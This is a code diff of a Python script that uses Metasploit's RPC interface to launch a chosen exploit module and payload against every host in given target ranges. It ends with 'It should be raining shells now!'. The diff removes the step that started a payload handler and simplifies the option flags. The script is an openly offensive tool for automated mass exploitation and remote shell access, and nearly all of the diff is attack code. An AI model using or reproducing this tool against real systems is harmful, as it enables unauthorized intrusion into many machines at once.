@@ -34,12 +34,7 @@ def parse_args():
         required=True
     )
     parser.add_argument(
-        '--handler-opts',
-        metavar='OPTIONS',
-        help='comma-separated options to pass to the payload handler'
-    )
-    parser.add_argument(
-        '--exploit-opts',
+        '--opts',
         metavar='OPTIONS',
         help='comma-separated options to pass to the exploit'
     )
@@ -54,30 +49,19 @@ def main():
         host=args.rpc_host, port=args.rpc_port, ssl=args.rpc_ssl,
         user=args.rpc_user, passwd=args.rpc_passwd
     )
-    print("[+] Starting the payload handler")
-    if args.handler_opts is None:
-        handler_opts = {}
-    else:
-        handler_opts = dict(opt.split('=') for opt in args.handler_opts.split(','))
-    handler_opts.update({
-        'PAYLOAD': args.payload,
-        'ExitOnSession': False
-    })
-    resp = rpc.call('module.execute', ['exploit', 'multi/handler', handler_opts])
-    print("[-] Started handler for {} (job #{})".format(args.payload, resp['job_id']))
     print("[+] Running {} against {}".format(args.exploit, args.targets))
-    if args.exploit_opts is None:
-        exploit_opts = {}
+    if args.opts is None:
+        opts = {}
     else:
-        exploit_opts = dict(opt.split('=') for opt in args.exploit_opts.split(','))
-    exploit_opts.update({
+        opts = dict(opt.split('=') for opt in args.opts.split(','))
+    opts.update({
         'PAYLOAD': args.payload,
         'DisablePayloadHandler': True
     })
     for target_range in args.targets.split(','):
         for target in iter_nmap_range(target_range):
-            exploit_opts['RHOST'] = str(target)
-            rpc.call('module.execute', ['exploit', args.exploit, exploit_opts])
+            opts['RHOST'] = str(target)
+            rpc.call('module.execute', ['exploit', args.exploit, opts])
             print("[-] Launched exploit against {}".format(target))
     print("[+] Done. It should be raining shells now!")
 
